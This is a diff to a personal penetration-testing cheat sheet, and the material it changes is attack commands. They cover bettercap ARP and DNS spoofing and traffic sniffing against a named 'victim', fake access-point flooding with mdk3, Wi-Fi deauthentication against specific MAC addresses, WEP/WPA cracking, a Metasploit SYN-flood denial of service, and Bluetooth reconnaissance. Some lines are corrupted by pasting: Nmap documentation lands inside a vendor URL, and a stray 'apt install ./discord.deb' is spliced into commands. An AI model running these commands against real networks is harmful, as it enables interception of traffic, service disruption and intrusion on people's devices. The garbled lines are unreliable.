@@ -92,7 +92,26 @@ Table of Contents
    * http://www.beyondsecurity.com/avds AVDS Vulnerability Assessment and Management
    * http://www.golismero.com Golismero
    * http://www.ikare-monitoring.com IKare
-   * http://www.nstalker.com N-Stalker X
+   * http://www.nstalker.com N-St -sV (Version detection)
+
+    Enables version detection, as discussed above. Alternatively, you can use -A, which enables version detection among other things.
+
+    -sR is an alias for -sV. Prior to March 2011, it was used to active the RPC grinder separately from version detection, but now these options are always combined.
+--allports (Don't exclude any ports from version detection)
+
+    By default, Nmap version detection skips TCP port 9100 because some printers simply print anything sent to that port, leading to dozens of pages of HTTP GET requests, binary SSL session requests, etc. This behavior can be changed by modifying or removing the Exclude directive in nmap-service-probes, or you can specify --allports to scan all ports regardless of any Exclude directive. 
+--version-intensity <intensity> (Set version scan intensity)
+
+    When performing a version scan (-sV), Nmap sends a series of probes, each of which is assigned a rarity value between one and nine. The lower-numbered probes are effective against a wide variety of common services, while the higher-numbered ones are rarely useful. The intensity level specifies which probes should be applied. The higher the number, the more likely it is the service will be correctly identified. However, high intensity scans take longer. The intensity must be between 0 and 9. The default is 7. When a probe is registered to the target port via the nmap-service-probes ports directive, that probe is tried regardless of intensity level. This ensures that the DNS probes will always be attempted against any open port 53, the SSL probe will be done against 443, etc.
+--version-light (Enable light mode)
+
+    This is a convenience alias for --version-intensity 2. This light mode makes version scanning much faster, but it is slightly less likely to identify services.
+--version-all (Try every single probe)
+
+    An alias for --version-intensity 9, ensuring that every single probe is attempted against each port.
+--version-trace (Trace version scan activity)
+
+alker X
    * https://www.rapid7.com/products/nexpose/index.jsp Nexpose
    * http://www.rapid7.com/products/appspider/ App Spider
    * http://www.milescan.com ParosPro
@@ -591,21 +610,21 @@ mitmweb [HAS NICE GUI]
 [bettercap - GUI ]:
 sudo bettercap -caplet http-ui 
  
-net.probe on [shows whos on the network]
-net.show [gives list of MAC and IP in graph]
-set arp.spoof.targets [192.xxx]
-arp.spoof on 
-net.sniff on [tells attacker what the victim is doing [inbound and out bound] 
-set dns.spoof.domains myebay.com [redirects to APACHE config]
+* net.probe on [shows whos on the network]
+* net.show [gives list of MAC and IP in graph]
+* set arp.spoof.targets [192.xxx]
+* arp.spoof on 
+* net.sniff on [tells attacker what the victim is doing [inbound and out bound] 
+* set dns.spoof.domains myebay.com [redirects to APACHE config]
 
 
-set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
-set arp.spoof.fullduplex true [sets attack to victim and  host]
-set arp.spoof.targets 192.victim_ip(IP address of the target Device)
-arp.spoof on
+* set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
+* set arp.spoof.fullduplex true [sets attack to victim and  host]
+* set arp.spoof.targets 192.victim_ip(IP address of the target Device)
+* arp.spoof on
 
-set net.sniff.local true
-net.sniff on
+* Vset net.sniff.local true
+* net.sniff on
 
 --------------------------------------------------- [ARP & SPOOF- Capture + REDIRECT TRAFFIC MITM] --------------------------------------
 [bettercap] --->> This will capure all websies visited by the target. 
@@ -622,10 +641,10 @@ nslookup the hopped domain, will likely be  a firewall like cloud flair. look fo
 the difference between IP and domain wiill likely be the real IP your o looking for. 
 tO cONFRIM, RUNN ;THE REAL ADDRESS through the results (DOMAINS) through NSLOOKUP, until an anomoly is found. 
 
-------------------------------------------------------AP-SPOOFING------------------------------------------------
-
-sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
-airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
+------------------------------------------------------[AP-SPOOFING]------------------------------------------------
+[mdk4] +[airodump]
+* sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
+* airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
 
 -------------------------------------------------------QUICK& DIRTY NETWORK SCAN ----------------------------
 function monitorWIFI() {
@@ -659,25 +678,29 @@ netcat [nc] --> [is a creepy, it can be used to follow you oce or persisant foll
 ------------------------------------------------------ WIFI-PESTER ------------------------------------------------------
 
 [DEAUTH]
-netdiscover -r 192.168.50.1/24
-aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
+* netdiscover -r 192.168.50.1/24
+* aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
 
 [CRACKING WEP / WPA]
-besside-ng en0 -c 6 -b
-airodump-ng wlx0013eff5483f --encrypt wep
+* besside-ng en0 -c 6 -b
+* airodump-ng wlx0013eff5483f --encrypt wep
 
 [make abunch of differnt APS] 
-sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
-airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
+* sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
+* airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
 
 [TCP FLOOD] 
-sudo nmap -p1-64580 192.168.50.111
-service postgresql start 
-msfconsole
-search synflood 
-use auxiliary/dos/tcp/synflood
-show options 
-set RHOST 192.168.50.111
+* sudo nmap -p1-64580 192.168.50.111
+* service postgresql start 
+* msfconsole
+
+* search synflood 
+* use auxiliary/dos/tcp/synflood
+* show options 
+* set RHOST 192.168.50.111
+[RHOST = VICTIM, LHOST = CLIENT]
+
+
 
 [DEAUTH USERS WHEN NOT ON ROUTER] 
 git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
@@ -693,37 +716,21 @@ sudo bash airgeddon.sh
 [btscanner] # launches GUI interface 
 [bettercap] 
 
-ble.recon on  ## returns the range and dsudo apt install ./discord.debevice name of enabled BT devices 
-ble.recon off 
-ble.show 
-ble.enum MAC_ADDRESS  # PROVIDES MORE INFO ON BLUETOOTH DEV 
+* ble.recon on  ## returns the range and dsudo apt install ./discord.debevice name of enabled BT devices 
+* ble.recon off 
+* ble.show 
+* ble.enum MAC_ADDRESS  # PROVIDES MORE INFO ON BLUETOOTH DEV 
 
 
 hciconfig -h ## bluetooth context manager, similar to wifi manager (help menu)
-man hciconfig 
-man hcitool 
-man sdptool  ## allows queries on bluetooth servers --> permeessions / avail services 
-man btscanner 
+* man hciconfig 
+* man hcitool 
+* man sdptool  ## allows queries on bluetooth servers --> permeessions / avail services 
+* man btscanner 
 
-hciconfig dev_name up 
-sdptool browse MAC_ADDRESS 
-btscanner # launches GUI interface 
-
-git clone https://github.com/evilsocket/bettercap
-cd bettercap
-bundle install
-gem build bettercap.gemspec
-sudo gem install bettercap*.gem
-
-
-sudo apt-get install build-essential ruby-dev libpcap-dev
-apt install golang
-go get github.com/bettercap/bettercapsudo apt install ./discord.deb
-cd $GOPATH/src/github.com/bettercap/bettercap
-make build
-sudo make install
-sudo bettercap
-bettercap 
+* hciconfig dev_name up 
+* sdptool browse MAC_ADDRESS 
+* btscanner # launches GUI interface 
 
 
 ------------------------------------------------------ FRAMEWORK - NMAP SCANNING 802.11  ------------------------------------------------------
@@ -1917,6 +1924,22 @@ show # displays information to be used in console
 show dashboard ## shows all current activities / tasks peformed 
 add # need to 
 #####################################
+
+git clone https://github.com/evilsocket/bettercap
+cd bettercap
+bundle install
+gem build bettercap.gemspec
+sudo gem install bettercap*.gem
+
+
+sudo apt-get install build-essential ruby-dev libpcap-dev
+apt install golang
+go get github.com/bettercap/bettercapsudo apt install ./discord.deb
+cd $GOPATH/src/github.com/bettercap/bettercap
+make build
+sudo make install
+sudo bettercap
+bettercap 
 
 
 ####### NIKTO VULN-SCANNER ######### 
